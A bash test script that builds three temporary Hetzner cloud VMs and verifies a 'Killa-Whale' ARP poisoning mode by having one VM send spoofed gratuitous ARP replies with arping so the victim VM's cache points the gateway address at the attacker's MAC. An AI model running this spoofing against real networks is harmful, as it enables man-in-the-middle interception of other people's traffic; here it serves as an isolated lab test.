#!/bin/bash
# FAST Killa-Whale Test (~60 seconds)
# Minimal test to verify ARP poisoning works

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🐋 Killa-Whale FAST Test (60 seconds)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Load token
if [ -f ~/.config/tide/hetzner.env ]; then
    source ~/.config/tide/hetzner.env
    export HCLOUD_TOKEN="$HETZNER_TIDE_TOKEN"
else
    echo -e "${RED}Error: Hetzner token not found${NC}"
    exit 1
fi

TIMESTAMP=$(date +%s)
NETWORK_NAME="kw-net-$TIMESTAMP"
GW_NAME="kw-gw-$TIMESTAMP"
TIDE_NAME="kw-tide-$TIMESTAMP"
VICTIM_NAME="kw-victim-$TIMESTAMP"

echo -e "${CYAN}[1/5] Creating network + 3 VMs in parallel...${NC}"

# Create network
hcloud network create --name "$NETWORK_NAME" --ip-range 192.168.100.0/24 >/dev/null
NETWORK_ID=$(hcloud network list | grep "$NETWORK_NAME" | awk '{print $1}')
hcloud network add-subnet "$NETWORK_ID" --network-zone us-west --type cloud --ip-range 192.168.100.0/24 >/dev/null 2>&1

# Create all 3 VMs in parallel
hcloud server create --name "$GW_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &
hcloud server create --name "$TIDE_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &
hcloud server create --name "$VICTIM_NAME" --type cpx11 --image ubuntu-22.04 --location hil \
    --ssh-key tide-testing --network "$NETWORK_ID" >/dev/null 2>&1 &

wait
echo -e "${GREEN}✓ Infrastructure ready${NC}"

# Get IPs
GW_IP=$(hcloud server ip "$GW_NAME")
TIDE_IP=$(hcloud server ip "$TIDE_NAME")
VICTIM_IP=$(hcloud server ip "$VICTIM_NAME")

GW_PRIV=$(hcloud server describe "$GW_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
TIDE_PRIV=$(hcloud server describe "$TIDE_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)
VICTIM_PRIV=$(hcloud server describe "$VICTIM_NAME" -o json | grep -oE '192\.168\.100\.[0-9]+' | head -1)

echo -e "${CYAN}[2/5] Waiting for SSH...${NC}"
for i in {1..15}; do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$GW_IP" "echo ready" >/dev/null 2>&1 && \
       ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$TIDE_IP" "echo ready" >/dev/null 2>&1 && \
       ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@"$VICTIM_IP" "echo ready" >/dev/null 2>&1; then
        echo -e "${GREEN}✓ All servers ready${NC}"
        break
    fi
    sleep 2
done

echo -e "${CYAN}[3/5] Minimal gateway setup (no packages)...${NC}"

# Just enable IP forwarding and NAT on gateway
ssh -o StrictHostKeyChecking=no root@"$GW_IP" "
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
" >/dev/null 2>&1

# Configure victim to use gateway
ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "
    ip route del default
    ip route add default via $GW_PRIV
" >/dev/null 2>&1

echo -e "${GREEN}✓ Basic routing configured${NC}"

echo -e "${CYAN}[4/5] Running ARP poisoning attack...${NC}"

# Get MACs before attack
GW_MAC=$(ssh -o StrictHostKeyChecking=no root@"$GW_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)
TIDE_MAC=$(ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "ip link show enp7s0 | grep ether | awk '{print \$2}'" 2>/dev/null)

echo "  Gateway MAC: $GW_MAC"
echo "  Tide MAC: $TIDE_MAC"

# Perform ARP poisoning from Tide
ssh -o StrictHostKeyChecking=no root@"$TIDE_IP" "
    # Install arping if needed (fast, small package)
    apt-get update -qq && apt-get install -y iputils-arping >/dev/null 2>&1
    
    # Enable forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Send gratuitous ARP claiming to be the gateway
    for i in {1..5}; do
        arping -c 1 -A -I enp7s0 -s $GW_PRIV $GW_PRIV >/dev/null 2>&1
        sleep 0.2
    done
" >/dev/null 2>&1

echo -e "${GREEN}✓ Attack completed${NC}"

echo -e "${CYAN}[5/5] Checking if ARP poisoning worked...${NC}"

# Check victim's ARP table
VICTIM_ARP_MAC=$(ssh -o StrictHostKeyChecking=no root@"$VICTIM_IP" "ip neigh show $GW_PRIV | awk '{print \$5}'" 2>/dev/null)

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "RESULTS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Victim's ARP entry for gateway ($GW_PRIV):"
echo "  Current MAC: $VICTIM_ARP_MAC"
echo "  Real Gateway MAC: $GW_MAC"
echo "  Tide MAC: $TIDE_MAC"
echo ""

if [ "$VICTIM_ARP_MAC" = "$TIDE_MAC" ]; then
    echo -e "${GREEN}✅ SUCCESS: Killa-Whale mode WORKS!${NC}"
    echo "   Victim's ARP cache has been poisoned"
    echo "   Traffic now goes through Tide instead of real gateway"
    RESULT="PASS"
else
    echo -e "${RED}❌ FAIL: ARP poisoning did not work${NC}"
    echo "   Victim still sees real gateway MAC"
    RESULT="FAIL"
fi

echo ""
echo -e "${CYAN}Cleanup:${NC}"
echo "1) Destroy all (recommended)"
echo "2) Keep for inspection"
read -p "Choice [1/2]: " CHOICE

if [ "$CHOICE" = "1" ]; then
    echo "Cleaning up..."
    hcloud server delete "$GW_NAME" "$TIDE_NAME" "$VICTIM_NAME" 2>/dev/null
    sleep 2
    hcloud network delete "$NETWORK_ID" 2>/dev/null
    echo -e "${GREEN}✓ Cleaned up${NC}"
else
    echo "Kept. Manual cleanup:"
    echo "  hcloud server delete $GW_NAME $TIDE_NAME $VICTIM_NAME"
    echo "  hcloud network delete $NETWORK_ID"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test Result: $RESULT"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
